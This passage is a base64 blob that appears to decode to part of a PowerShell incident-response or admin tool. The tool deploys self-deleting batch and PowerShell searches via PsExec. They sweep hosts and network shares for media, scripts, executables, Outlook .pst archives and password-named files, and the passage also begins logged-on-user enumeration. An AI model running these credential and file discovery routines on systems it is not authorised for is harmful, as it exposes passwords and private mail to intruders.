lYXJjaCsnIiAlJWYgaW4gKCouanBnICouanBlZyAqLnRpZiAqLmdpZiAqLmJtcCkgZG8gKAoJCQkJZWNobyAlQ09NUFVURVJOQU1FJSwlJX5ueGYsJSV+ZHBmCgkJCQkpID4+ICJDOlxJbWFnZUZpbGVTZWFyY2gzOTIxMjUyODEiCgkJCQkoZ290bykgMj5udWwgJiBkZWwgIiV+ZjAiJwoKCQkJCSRTY3JpcHQ6SW1hZ2VTZWFyY2hDb2RlX1BTMSA9ICcKCQkJCWlmIChUZXN0LVBhdGggIkM6XEltYWdlRmlsZVNlYXJjaDM5MjEyNTI4MSIpe1JlbW92ZS1JdGVtIC1Gb3JjZSAiQzpcSW1hZ2VGaWxlU2VhcmNoMzkyMTI1MjgxIn0KCQkJCSRpbmNsdWRlID0gIiouanBnIiwgIiouanBlZyIsICIqLnRpZiIsICIqLmdpZiIsICIqLmJtcCIKCQkJCXRyeXsKCQkJCUdldC1DaGlsZEl0ZW0gLXBhdGggIicrJFBhdGhUb1NlYXJjaCsnKiIgLUluY2x1ZGUgJGluY2x1ZGUgLUV4Y2x1ZGUgIkFwcGxpY2F0aW9uIERhdGEiLCAiQXBwRGF0YSIgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBzaWxlbnRseWNvbnRpbnVlIHwKCQkJCWZvcmVhY2ggeyR7ZW52OkNPTVBVVEVSTkFNRX0rIiwiKyRfLk5hbWUrIiwiKyRfLkRpcmVjdG9yeW5hbWV9fAoJCQkJT3V0LWZpbGUgIkM6XEltYWdlRmlsZVNlYXJjaDM5MjEyNTI4MSIKCQkJCX0gY2F0Y2gge2NvbnRpbnVlfQoJCQkJUmVtb3ZlLUl0ZW0gLUZvcmNlICJDOlxQU0V4ZWNTaGVsbENvZGUucHMxIicKCQkJfQoJCQkyewoJCQkJJFNjcmlwdDpTY2FuQ2hvaWNlQXJyYXkuYWRkKDEwMil8b3V0LW51bGwKCQkJCSRTY3JpcHQ6QXVkaW9TZWFyY2hDb2RlX0JBVCA9ICcKCQkJCUBlY2hvIG9mZgoJCQkJSUYgRVhJU1QgIkM6XEF1ZGlvRmlsZVNlYXJjaDM5MjEyNTI4MSIgREVMICJDOlxBdWRpb0ZpbGVTZWFyY2gzOTIxMjUyODEiCgkJCQlmb3IgL1IgIicrJFBhdGhUb1NlYXJjaCsnIiAlJWYgaW4gKCoubTRhICoubTRwICoubXAzICoud21hKSBkbyAoCgkJCQllY2hvICVDT01QVVRFUk5BTUUlLCUlfm54ZiwlJX5kcGYKCQkJCSkgPj4gIkM6XEF1ZGlvRmlsZVNlYXJjaDM5MjEyNTI4MSIKCQkJCShnb3RvKSAyPm51bCAmIGRlbCAiJX5mMCInCgkJCQkKCQkJCSRTY3JpcHQ6QXVkaW9TZWFyY2hDb2RlX1BTMSA9ICcKCQkJCWlmIChUZXN0LVBhdGggIkM6XEF1ZGlvRmlsZVNlYXJjaDM5MjEyNTI4MSIpe1JlbW92ZS1JdGVtIC1Gb3JjZSAiQzpcQXVkaW9GaWxlU2VhcmNoMzkyMTI1MjgxIn0KCQkJCSRpbmNsdWRlID0gIioubTRhIiwgIioubTRwIiwgIioubXAzIiwgIioud21hIgoJCQkJdHJ5ewoJCQkJR2V0LUNoaWxkSXRlbSAtcGF0aCAiJyskUGF0aFRvU2VhcmNoKycqIiAtSW5jbHVkZSAkaW5jbHVkZSAtRXhjbHVkZSAiQXBwbGljYXRpb24gRGF0YSIsICJBcHBEYXRhIiAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIHNpbGVudGx5Y29udGludWUgfAoJCQkJZm9yZWFjaCB7JHtlbnY6Q09NUFVURVJOQU1FfSsiLCIrJF8uTmFtZSsiLCIrJF8uRGlyZWN0b3J5bmFtZX18CgkJCQlPdXQtZmlsZSAiQzpcQXVkaW9GaWxlU2VhcmNoMzkyMTI1MjgxIgoJCQkJfSBjYXRjaCB7Y29udGludWV9CgkJCQlSZW1vdmUtSXRlbSAtRm9yY2UgIkM6XFBTRXhlY1NoZWxsQ29kZS5wczEiJwkJCQkKCQkJfQoJCQkzewoJCQkJJFNjcmlwdDpTY2FuQ2hvaWNlQXJyYXkuYWRkKDEwMyl8b3V0LW51bGwKCQkJCSRTY3JpcHQ6VmlkZW9TZWFyY2hDb2RlX0JBVCA9ICcKCQkJCUBlY2hvIG9mZgoJCQkJSUYgRVhJU1QgIkM6XFZpZGVvRmlsZVNlYXJjaDM5MjEyNTI4MSIgREVMICJDOlxWaWRlb0ZpbGVTZWFyY2gzOTIxMjUyODEiCgkJCQlmb3IgL1IgIicrJFBhdGhUb1NlYXJjaCsnIiAlJWYgaW4gKCouYXNmICouYXZpICoubTR2ICoubW92ICoubXA0ICoubXBlZyAqLm1wZyAqLndtdikgZG8gKAoJCQkJZWNobyAlQ09NUFVURVJOQU1FJSwlJX5ueGYsJSV+ZHBmCgkJCQkpID4+ICJDOlxWaWRlb0ZpbGVTZWFyY2gzOTIxMjUyODEiCgkJCQkoZ290bykgMj5udWwgJiBkZWwgIiV+ZjAiJwkKCQkJCQoJCQkJJFNjcmlwdDpWaWRlb1NlYXJjaENvZGVfUFMxID0gJwoJCQkJaWYgKFRlc3QtUGF0aCAiQzpcVmlkZW9GaWxlU2VhcmNoMzkyMTI1MjgxIil7UmVtb3ZlLUl0ZW0gLUZvcmNlICJDOlxWaWRlb0ZpbGVTZWFyY2gzOTIxMjUyODEifQoJCQkJJGluY2x1ZGUgPSAiKi5hc2YiLCAiKi5hdmkiLCAiKi5tNHYiLCAiKi5tb3YiLCAiKi5tcDQiLCAiKi5tcGVnIiwgIioubXBnIiwgIioud212IgoJCQkJdHJ5ewoJCQkJR2V0LUNoaWxkSXRlbSAtcGF0aCAiJyskUGF0aFRvU2VhcmNoKycqIiAtSW5jbHVkZSAkaW5jbHVkZSAtRXhjbHVkZSAiQXBwbGljYXRpb24gRGF0YSIsICJBcHBEYXRhIiAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIHNpbGVudGx5Y29udGludWUgfAoJCQkJZm9yZWFjaCB7JHtlbnY6Q09NUFVURVJOQU1FfSsiLCIrJF8uTmFtZSsiLCIrJF8uRGlyZWN0b3J5bmFtZX18CgkJCQlPdXQtZmlsZSAiQzpcVmlkZW9GaWxlU2VhcmNoMzkyMTI1MjgxIgoJCQkJfSBjYXRjaCB7Y29udGludWV9CgkJCQlSZW1vdmUtSXRlbSAtRm9yY2UgIkM6XFBTRXhlY1NoZWxsQ29kZS5wczEiJwkJCQkJCgkJCX0KCQkJNHsKCQkJCSRTY3JpcHQ6U2NhbkNob2ljZUFycmF5LmFkZCgxMDQpfG91dC1udWxsCgkJCQkkU2NyaXB0OlNjcmlwdFNlYXJjaENvZGVfQkFUID0gJwoJCQkJQGVjaG8gb2ZmCgkJCQlJRiBFWElTVCAiQzpcU2NyaXB0RmlsZVNlYXJjaDM5MjEyNTI4MSIgREVMICJDOlxTY3JpcHRGaWxlU2VhcmNoMzkyMTI1MjgxIgoJCQkJZm9yIC9SICInKyRQYXRoVG9TZWFyY2grJyIgJSVmIGluICgqLnBzMSAqLnBzbTEgKi52YiAqLnZicyAqLmJhdCAqLmNtZCkgZG8gKAoJCQkJZWNobyAlQ09NUFVURVJOQU1FJSwlJX5ueGYsJSV+ZHBmCgkJCQkpID4+ICJDOlxTY3JpcHRGaWxlU2VhcmNoMzkyMTI1MjgxIgoJCQkJKGdvdG8pIDI+bnVsICYgZGVsICIlfmYwIicJCgkJCQkKCQkJCSRTY3JpcHQ6U2NyaXB0U2VhcmNoQ29kZV9QUzEgPSAnCgkJCQlpZiAoVGVzdC1QYXRoICJDOlxTY3JpcHRGaWxlU2VhcmNoMzkyMTI1MjgxIil7UmVtb3ZlLUl0ZW0gLUZvcmNlICJDOlxTY3JpcHRGaWxlU2VhcmNoMzkyMTI1MjgxIn0KCQkJCSRpbmNsdWRlID0gIioucHMxIiwgIioucHNtMSIsICIqLnZiIiwgIioudmJzIiwgIiouYmF0IiwgIiouY21kIgoJCQkJdHJ5ewoJCQkJR2V0LUNoaWxkSXRlbSAtcGF0aCAiJyskUGF0aFRvU2VhcmNoKycqIiAtSW5jbHVkZSAkaW5jbHVkZSAtRXhjbHVkZSAiQXBwbGljYXRpb24gRGF0YSIsICJBcHBEYXRhIiAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIHNpbGVudGx5Y29udGludWUgfAoJCQkJZm9yZWFjaCB7JHtlbnY6Q09NUFVURVJOQU1FfSsiLCIrJF8uTmFtZSsiLCIrJF8uRGlyZWN0b3J5bmFtZX18CgkJCQlPdXQtZmlsZSAiQzpcU2NyaXB0RmlsZVNlYXJjaDM5MjEyNTI4MSIKCQkJCX0gY2F0Y2gge2NvbnRpbnVlfQoJCQkJUmVtb3ZlLUl0ZW0gLUZvcmNlICJDOlxQU0V4ZWNTaGVsbENvZGUucHMxIicJCQkJCgkJCX0KCQkJNXsKCQkJCSRTY3JpcHQ6U2NhbkNob2ljZUFycmF5LmFkZCgxMDUpfG91dC1udWxsCgkJCQkkU2NyaXB0OkV4ZWN1dGFibGVTZWFyY2hDb2RlX0JBVCA9ICcKCQkJCUBlY2hvIG9mZgoJCQkJSUYgRVhJU1QgIkM6XEV4ZWN1dGFibGVGaWxlU2VhcmNoMzkyMTI1MjgxIiBERUwgIkM6XEV4ZWN1dGFibGVGaWxlU2VhcmNoMzkyMTI1MjgxIgoJCQkJZm9yIC9SICInKyRQYXRoVG9TZWFyY2grJyIgJSVmIGluICgqLmV4ZSAqLmRsbCAqLnN5cykgZG8gKAoJCQkJZWNobyAlQ09NUFVURVJOQU1FJSwlJX5ueGYsJSV+ZHBmCgkJCQkpID4+ICJDOlxFeGVjdXRhYmxlRmlsZVNlYXJjaDM5MjEyNTI4MSIKCQkJCShnb3RvKSAyPm51bCAmIGRlbCAiJX5mMCInCgkJCQkKCQkJCSRTY3JpcHQ6RXhlY3V0YWJsZVNlYXJjaENvZGVfUFMxID0gJwoJCQkJaWYgKFRlc3QtUGF0aCAiQzpcRXhlY3V0YWJsZUZpbGVTZWFyY2gzOTIxMjUyODEiKXtSZW1vdmUtSXRlbSAtRm9yY2UgIkM6XEV4ZWN1dGFibGVGaWxlU2VhcmNoMzkyMTI1MjgxIn0KCQkJCSRpbmNsdWRlID0gIiouZXhlIiwgIiouZGxsIiwgIiouc3lzIgoJCQkJdHJ5ewoJCQkJR2V0LUNoaWxkSXRlbSAtcGF0aCAiJyskUGF0aFRvU2VhcmNoKycqIiAtSW5jbHVkZSAkaW5jbHVkZSAtRXhjbHVkZSAiQXBwbGljYXRpb24gRGF0YSIsICJBcHBEYXRhIiAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIHNpbGVudGx5Y29udGludWUgfAoJCQkJZm9yZWFjaCB7JHtlbnY6Q09NUFVURVJOQU1FfSsiLCIrJF8uTmFtZSsiLCIrJF8uRGlyZWN0b3J5bmFtZX18CgkJCQlPdXQtZmlsZSAiQzpcRXhlY3V0YWJsZUZpbGVTZWFyY2gzOTIxMjUyODEiCgkJCQl9IGNhdGNoIHtjb250aW51ZX0KCQkJCVJlbW92ZS1JdGVtIC1Gb3JjZSAiQzpcUFNFeGVjU2hlbGxDb2RlLnBzMSInCQkJCQoJCQl9CgkJCTZ7CgkJCQkkU2NyaXB0OlNjYW5DaG9pY2VBcnJheS5hZGQoMTA2KXxvdXQtbnVsbAoJCQkJJFNjcmlwdDpEYXRhRmlsZVNlYXJjaENvZGVfQkFUID0gJwoJCQkJQGVjaG8gb2ZmCgkJCQlJRiBFWElTVCAiQzpcRGF0YUZpbGVTZWFyY2gzOTIxMjUyODEiIERFTCAiQzpcRGF0YUZpbGVTZWFyY2gzOTIxMjUyODEiCgkJCQlmb3IgL1IgIicrJFBhdGhUb1NlYXJjaCsnIiAlJWYgaW4gKCoucHN0KSBkbyAoCgkJCQllY2hvICVDT01QVVRFUk5BTUUlLCUlfm54ZiwlJX5kcGYKCQkJCSkgPj4gIkM6XERhdGFGaWxlU2VhcmNoMzkyMTI1MjgxIgoJCQkJKGdvdG8pIDI+bnVsICYgZGVsICIlfmYwIicJCgkJCQkKCQkJCSRTY3JpcHQ6RGF0YUZpbGVTZWFyY2hDb2RlX1BTMSA9ICcKCQkJCWlmIChUZXN0LVBhdGggIkM6XERhdGFGaWxlU2VhcmNoMzkyMTI1MjgxIil7UmVtb3ZlLUl0ZW0gLUZvcmNlICJDOlxEYXRhRmlsZVNlYXJjaDM5MjEyNTI4MSJ9CgkJCQkkaW5jbHVkZSA9ICIqLnBzdCIKCQkJCXRyeXsKCQkJCUdldC1DaGlsZEl0ZW0gLXBhdGggIicrJFBhdGhUb1NlYXJjaCsnKiIgLUluY2x1ZGUgJGluY2x1ZGUgLUV4Y2x1ZGUgIkFwcGxpY2F0aW9uIERhdGEiLCAiQXBwRGF0YSIgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBzaWxlbnRseWNvbnRpbnVlIHwKCQkJCWZvcmVhY2ggeyR7ZW52OkNPTVBVVEVSTkFNRX0rIiwiKyRfLk5hbWUrIiwiKyRfLkRpcmVjdG9yeW5hbWV9fAoJCQkJT3V0LWZpbGUgIkM6XERhdGFGaWxlU2VhcmNoMzkyMTI1MjgxIgoJCQkJfSBjYXRjaCB7Y29udGludWV9CgkJCQlSZW1vdmUtSXRlbSAtRm9yY2UgIkM6XFBTRXhlY1NoZWxsQ29kZS5wczEiJwkJCQkJCgkJCX0KCQkJN3sKCQkJCSRTY3JpcHQ6U2NhbkNob2ljZUFycmF5LmFkZCgxMDcpfG91dC1udWxsCgkJCQkkU2NyaXB0OlBhc3N3b3JkU2VhcmNoQ29kZV9CQVQgPSAnCgkJCQlAZWNobyBvZmYKCQkJCUlGIEVYSVNUICJDOlxQYXNzd29yZEZpbGVTZWFyY2gzOTIxMjUyODEiIERFTCAiQzpcUGFzc3dvcmRGaWxlU2VhcmNoMzkyMTI1MjgxIgoJCQkJZm9yIC9SICInKyRQYXRoVG9TZWFyY2grJyIgJSVmIGluICgqcGFzc3cqICpwd2QqKSBkbyAoCgkJCQllY2hvICVDT01QVVRFUk5BTUUlLCUlfm54ZiwlJX5kcGYKCQkJCSkgPj4gIkM6XFBhc3N3b3JkRmlsZVNlYXJjaDM5MjEyNTI4MSIKCQkJCShnb3RvKSAyPm51bCAmIGRlbCAiJX5mMCInCQoJCQkJCgkJCQkkU2NyaXB0OlBhc3N3b3JkU2VhcmNoQ29kZV9QUzEgPSAnCgkJCQlpZiAoVGVzdC1QYXRoICJDOlxQYXNzd29yZEZpbGVTZWFyY2gzOTIxMjUyODEiKXtSZW1vdmUtSXRlbSAtRm9yY2UgIkM6XFBhc3N3b3JkRmlsZVNlYXJjaDM5MjEyNTI4MSJ9CgkJCQkkaW5jbHVkZSA9ICIqcGFzc3cqIiwgIipwd2QqIgoJCQkJdHJ5ewoJCQkJR2V0LUNoaWxkSXRlbSAtcGF0aCAiJyskUGF0aFRvU2VhcmNoKycqIiAtSW5jbHVkZSAkaW5jbHVkZSAtRXhjbHVkZSAiQXBwbGljYXRpb24gRGF0YSIsICJBcHBEYXRhIiAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIHNpbGVudGx5Y29udGludWUgfAoJCQkJZm9yZWFjaCB7JHtlbnY6Q09NUFVURVJOQU1FfSsiLCIrJF8uTmFtZSsiLCIrJF8uRGlyZWN0b3J5bmFtZX18CgkJCQlPdXQtZmlsZSAiQzpcUGFzc3dvcmRGaWxlU2VhcmNoMzkyMTI1MjgxIgoJCQkJfSBjYXRjaCB7Y29udGludWV9CgkJCQlSZW1vdmUtSXRlbSAtRm9yY2UgIkM6XFBTRXhlY1NoZWxsQ29kZS5wczEiJwkJCQkKCQkJfQoJCQkiaCJ7cmV0dXJuICRmYWxzZX0KCQkJImhvbWUie3JldHVybiAkZmFsc2V9CgkJCSJ4IntFeGl0RnVuY3Rpb259CgkJCSJleGl0IntFeGl0RnVuY3Rpb259CgkJfQoJfQp9CgojRXhlY3V0ZSBuZXQgc2hhcmUgZmlsZSBzZWFyY2ggd2l0aCBwcm9ncmVzcyBtZXRlci4KRnVuY3Rpb24gTmV0U2hhcmVGaWxlU2VhcmNoX1J1bgp7CglwYXJhbSgkcGF0aCwgJGluY2x1ZGUsICRTY2FuVHlwZSkKCgkjaGFzaCB0YWJsZSB0byBzdG9yZSB2YXJpYWJsZXMgZm9yIHByb2dyZXNzIG1ldGVyCgkkcHJvZ1BhcmFtPUB7CgkJQWN0aXZpdHkgPSAiJFNjYW5UeXBlIgoJCUN1cnJlbnRPcGVyYXRpb24gPSAkcGF0aAoJCVN0YXR1cz0iUXVlcnlpbmcgdG9wIGxldmVsIGZvbGRlcnMiCgkJUGVyY2VudENvbXBsZXRlPTAKCX0gCgkKCVdyaXRlLVByb2dyZXNzIEBwcm9nUGFyYW0gCgkKCSNHZXQgYWxsIHN1YmRpcmVjdG9yaWVzIGluIHBhdGggdG8gc2VhcmNoIAoJJHRvcCA9IEdldC1DaGlsZEl0ZW0gLVBhdGggJHBhdGggfFdoZXJleyRfLlBTSXNDb250YWluZXJ9CgkjaW5pdGlhbGl6ZSBhIGNvdW50ZXIKCSRpPTAKCWZvcmVhY2ggKCRmb2xkZXIgaW4gJHRvcCkgewoJCSRmb2xkZXI9JGZvbGRlci5GdWxsTmFtZQoJCSNjYWxjdWxhdGUgcGVyY2VudGFnZSBiYXNlZCBvbiBudW1iZXIgb2YgZm9sZGVycyBpbiBwYXRoIHRvIHNlYXJjaAoJCSRpKysKCQkKCQkjc2V0IHZhcmlhYmxlcyBmb3IgcHJvZ3Jlc3MgbWV0ZXIKCQlbaW50XSRwY3QgPSAoJGkvJHRvcC5jb3VudCkqMTAwIAoJCSRwcm9nUGFyYW0uQ3VycmVudE9wZXJhdGlvbiA9IlNlYXJjaGluZzogJGZvbGRlciIKCQkkcHJvZ1BhcmFtLlN0YXR1cz0iUHJvZ3Jlc3MiCgkJJHByb2dQYXJhbS5QZXJjZW50Q29tcGxldGUgPSAkcGN0CgkJCgkJI1dyaXRlIHRoZSBwcm9ncmVzcwoJCVdyaXRlLVByb2dyZXNzIEBwcm9nUGFyYW0gCgkJCgkJI1BlcmZvcm0gdGhlIGZpbGUgc2VhcmNoIGluIHRoZSBzdWJkaXJlY3Rvcnkgb2YgdGhlIHBhdGgKCQlHZXQtQ2hpbGRJdGVtIC1wYXRoICIkZm9sZGVyXCoiIC1JbmNsdWRlICRpbmNsdWRlIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gc2lsZW50bHljb250aW51ZSB8CgkJZm9yZWFjaCB7JF8uTmFtZSsiLCIrJF8uRGlyZWN0b3J5bmFtZX0KCX0gICAKfQoKRnVuY3Rpb24gTmV0U2hhcmVGaWxlU2VhcmNoCnsKCSRGaWxlVHlwZXNBcnJheSA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdAoJV2hpbGUgKCR0cnVlKSAjTG9vcCB1bnRpbCBpbnB1dCBpcyB2YWxpZAoJewoJCVdyaXRlLUhvc3QgIkVudGVyIGZ1bGwgcGF0aCB0byBuZXR3b3JrIHNoYXJlOiAiIC1Ob05ld0xpbmUKCQkkU2VhcmNoTmV0d29ya1NoYXJlID0gUmVhZFllbGxvdwoJCQoJCSNNYWtlIHN1cmUgdGhhdCBpbnB1dCBpcyB2YWxpZC4gIAoJCWlmICgkU2VhcmNoTmV0d29ya1NoYXJlIC1hbmQgKFRlc3QtUGF0aCAkU2VhcmNoTmV0d29ya1NoYXJlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkge2JyZWFrfQkKCQllbHNlIAoJCXsKCQkJV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFJlZCAiSW52YWxpZCBQYXRoClVzZSBmb3JtYXQ6IFxcc2VydmVybmFtZVxzaGFyZW5hbWUiCgkJfSAKCX0KCQoJJEZpbGVUeXBlc0FycmF5LmFkZCgkKENob29zZUZpbGVUeXBlcykpICNmaWxsIGFycmF5IHdpdGggZmlsZSB0eXBlcyB0byBzZWFyY2gKCSRTY3JpcHQ6RGVwbG95ID0gJGZhbHNlICNTZWFyY2ggaXMgbm90IGV4ZWN1dGVkIHVzaW5nIHBzZXhlYwoKCSNpdGVyYXRlIHRocm91Z2ggZmlsZSBjaG9pY2VzIGFuZCBmaW5kIGZpbGVzCglmb3IoJGk9MDsgJGkgLWx0ICRGaWxlVHlwZXNBcnJheS5jb3VudDsgJGkrKykKCXsKCQlDcmVhdGVUZW1wRGlyCgkJc3dpdGNoICgkRmlsZVR5cGVzQXJyYXlbJGldKQoJCXsKCQkJMXsgICNpbWFnZSBmaWxlcwoJCQkJJHNjcmlwdDpvdXRmaWxlID0gIkltYWdlRmlsZXNfU2hhcmUkKChnZXQtZGF0ZSkudG9zdHJpbmcoIkhIbW1zcyIpKS5jc3YiCgkJCQlXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93ICJTZWFyY2hpbmcgZm9yIGltYWdlIGZpbGVzLiIKCQkJCSJGaWxlLERpcmVjdG9yeSIgfCBBZGQtQ29udGVudCAiJFRFTVBfRElSXCRvdXRmaWxlIgoJCQkJJGluY2x1ZGUgPSAiKi5qcGciLCAiKi5qcGVnIiwgIioudGlmIiwgIiouZ2lmIiwgIiouYm1wIgoJCQkJTmV0U2hhcmVGaWxlU2VhcmNoX1J1biAkU2VhcmNoTmV0d29ya1NoYXJlICRpbmNsdWRlICJJbWFnZSBTZWFyY2g6IiB8QWRkLUNvbnRlbnQgIiRURU1QX0RJUlwkb3V0ZmlsZSIKCQkJCUNvbnZlcnRGaWxlRm9ybWF0ICIkVEVNUF9ESVJcJG91dGZpbGUiCgkJCX0KCQkJMnsgICNBdWRpbyBGaWxlcwoJCQkJJHNjcmlwdDpvdXRmaWxlID0gIkF1ZGlvRmlsZXNfU2hhcmUkKChnZXQtZGF0ZSkudG9zdHJpbmcoIkhIbW1zcyIpKS5jc3YiCgkJCQlXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93ICJTZWFyY2hpbmcgZm9yIGF1ZGlvIGZpbGVzLiIKCQkJCSJGaWxlLERpcmVjdG9yeSIgfCBBZGQtQ29udGVudCAiJFRFTVBfRElSXCRvdXRmaWxlIgoJCQkJJGluY2x1ZGUgPSAiKi5tNGEiLCAiKi5tNHAiLCAiKi5tcDMiLCAiKi53bWEiCgkJCQlOZXRTaGFyZUZpbGVTZWFyY2hfUnVuICRTZWFyY2hOZXR3b3JrU2hhcmUgJGluY2x1ZGUgIkF1ZGlvIFNlYXJjaDoiIHxBZGQtQ29udGVudCAiJFRFTVBfRElSXCRvdXRmaWxlIgoJCQkJQ29udmVydEZpbGVGb3JtYXQgIiRURU1QX0RJUlwkb3V0ZmlsZSIKCQkJfQoJCQkzeyAgI1ZpZGVvIEZpbGVzCgkJCQkkc2NyaXB0Om91dGZpbGUgPSAiVmlkZW9GaWxlc19TaGFyZSQoKGdldC1kYXRlKS50b3N0cmluZygiSEhtbXNzIikpLmNzdiIJCQkJCgkJCQlXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93ICJTZWFyY2hpbmcgZm9yIHZpZGVvIGZpbGVzLiIKCQkJCSJGaWxlLERpcmVjdG9yeSIgfCBBZGQtQ29udGVudCAiJFRFTVBfRElSXCRvdXRmaWxlIgoJCQkJJGluY2x1ZGUgPSAiKi5hc2YiLCAiKi5hdmkiLCAiKi5tNHYiLCAiKi5tb3YiLCAiKi5tcDQiLCAiKi5tcGVnIiwgIioubXBnIiwgIioud212IgoJCQkJTmV0U2hhcmVGaWxlU2VhcmNoX1J1biAkU2VhcmNoTmV0d29ya1NoYXJlICRpbmNsdWRlICJWaWRlbyBTZWFyY2g6IiB8QWRkLUNvbnRlbnQgIiRURU1QX0RJUlwkb3V0ZmlsZSIKCQkJCUNvbnZlcnRGaWxlRm9ybWF0ICIkVEVNUF9ESVJcJG91dGZpbGUiCgkJCX0KCQkJNHsgICNTY3JpcHQgRmlsZXMKCQkJCSRzY3JpcHQ6b3V0ZmlsZSA9ICJTY3JpcHRGaWxlc19TaGFyZSQoKGdldC1kYXRlKS50b3N0cmluZygiSEhtbXNzIikpLmNzdiIJCQkJCgkJCQlXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93ICJTZWFyY2hpbmcgZm9yIHdpbmRvd3Mgc2NyaXB0IGZpbGVzLiIKCQkJCSJGaWxlLERpcmVjdG9yeSIgfCBBZGQtQ29udGVudCAiJFRFTVBfRElSXCRvdXRmaWxlIgoJCQkJJGluY2x1ZGUgPSAiKi5wczEiLCAiKi5wc20xIiwgIioudmIiLCAiKi52YnMiLCAiKi5iYXQiLCAiKi5jbWQiCgkJCQlOZXRTaGFyZUZpbGVTZWFyY2hfUnVuICRTZWFyY2hOZXR3b3JrU2hhcmUgJGluY2x1ZGUgIlNjcmlwdCBTZWFyY2g6IiB8QWRkLUNvbnRlbnQgIiRURU1QX0RJUlwkb3V0ZmlsZSIKCQkJCUNvbnZlcnRGaWxlRm9ybWF0ICIkVEVNUF9ESVJcJG91dGZpbGUiCgkJCX0KCQkJNXsgI0V4ZWN1dGFibGUgRmlsZXMKCQkJCSRzY3JpcHQ6b3V0ZmlsZSA9ICJFeGVjdXRhYmxlRmlsZXNfU2hhcmUkKChnZXQtZGF0ZSkudG9zdHJpbmcoIkhIbW1zcyIpKS5jc3YiCQkJCQoJCQkJV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFllbGxvdyAiU2VhcmNoaW5nIGZvciBleGVjdXRhYmxlIGZpbGVzLiIKCQkJCSJGaWxlLERpcmVjdG9yeSIgfCBBZGQtQ29udGVudCAiJFRFTVBfRElSXCRvdXRmaWxlIiAKCQkJCSRpbmNsdWRlID0gIiouZXhlIiwgIiouZGxsIiwgIiouc3lzIgoJCQkJTmV0U2hhcmVGaWxlU2VhcmNoX1J1biAkU2VhcmNoTmV0d29ya1NoYXJlICRpbmNsdWRlICJFeGVjdXRhYmxlIFNlYXJjaDoiIHxBZGQtQ29udGVudCAiJFRFTVBfRElSXCRvdXRmaWxlIgoJCQkJQ29udmVydEZpbGVGb3JtYXQgIiRURU1QX0RJUlwkb3V0ZmlsZSIKCQkJfQoJCQk2eyAgI091dGxvb2sgZGF0YSBmaWxlcwoJCQkJJHNjcmlwdDpvdXRmaWxlID0gIk91dGxvb2tEYXRhRmlsZXNfU2hhcmUkKChnZXQtZGF0ZSkudG9zdHJpbmcoIkhIbW1zcyIpKS5jc3YiCQkJCQoJCQkJV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFllbGxvdyAiU2VhcmNoaW5nIGZvciBPdXRsb29rIGRhdGEgZmlsZXMuIgoJCQkJIkZpbGUsRGlyZWN0b3J5IiB8IEFkZC1Db250ZW50ICIkVEVNUF9ESVJcJG91dGZpbGUiIAoJCQkJJGluY2x1ZGUgPSAiKi5wc3QiCgkJCQlOZXRTaGFyZUZpbGVTZWFyY2hfUnVuICRTZWFyY2hOZXR3b3JrU2hhcmUgJGluY2x1ZGUgIk91dGxvb2sgRGF0YS1maWxlIFNlYXJjaDoiICB8QWRkLUNvbnRlbnQgIiRURU1QX0RJUlwkb3V0ZmlsZSIKCQkJCUNvbnZlcnRGaWxlRm9ybWF0ICIkVEVNUF9ESVJcJG91dGZpbGUiCgkJCX0KCQkJN3sgICNwYXNzd29yZCBmaWxlcwoJCQkJJHNjcmlwdDpvdXRmaWxlID0gIlBhc3N3b3JkRmlsZXNfU2hhcmUkKChnZXQtZGF0ZSkudG9zdHJpbmcoIkhIbW1zcyIpKS5jc3YiCQkJCQoJCQkJV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFllbGxvdyAiU2VhcmNoaW5nIGZvciBwYXNzd29yZCBmaWxlcy4iCgkJCQkiRmlsZSxEaXJlY3RvcnkiIHwgQWRkLUNvbnRlbnQgIiRURU1QX0RJUlwkb3V0ZmlsZSIKCQkJCSRpbmNsdWRlID0gIipwYXNzdyoiLCAiKnB3ZCoiCgkJCQlOZXRTaGFyZUZpbGVTZWFyY2hfUnVuICRTZWFyY2hOZXR3b3JrU2hhcmUgJGluY2x1ZGUgIlBhc3N3b3JkIFNlYXJjaDoiIHxBZGQtQ29udGVudCAiJFRFTVBfRElSXCRvdXRmaWxlIgoJCQkJQ29udmVydEZpbGVGb3JtYXQgIiRURU1QX0RJUlwkb3V0ZmlsZSIJCQkKCQkJfQoJCX0KCX0KfQoKRnVuY3Rpb24gTG9nZ2VkT25Vc2Vycwp7CglXcml0ZS1Ib3N0CglpZigkc2NyaXB0OkZpcnN0UnVuQ29tcHMpICNUZXN0IHRvIHNlZSBpZiBsaXN0IG9mIGFjdGl2ZSBjb21wdXRlcnMgZXhpc3RzIG9yIG5vdAoJewkJCgkJJHNjcmlwdDpBY3RpdmVDb21wdXRlcnMgPSBHZXRBY3RpdmVDb21wdXRlcnMgCgl9CgkKCSRTY3JpcHQ6RGVwbG95ID0gJGZhbHNlCgkkU2NyaXB0Om91dGZpbGU9IkxvZ2dlZE9uVXNlcnMkKChnZXQtZGF0ZSkudG9zdHJpbmcoIkhIbW1zcyIpKS5jc3YiCgkKCVdyaXRlLUhvc3QgJChnZXQtRGF0ZSkKCVdyaXRlLUhvc3QgLUZvcmVncm91bmRDb2xvciBZZWxsb3cgIkVudW1lcmF0aW5nIGxvZ2dlZCBvbiB1c2VycyIKCUNyZWF0ZVRlbXBEaX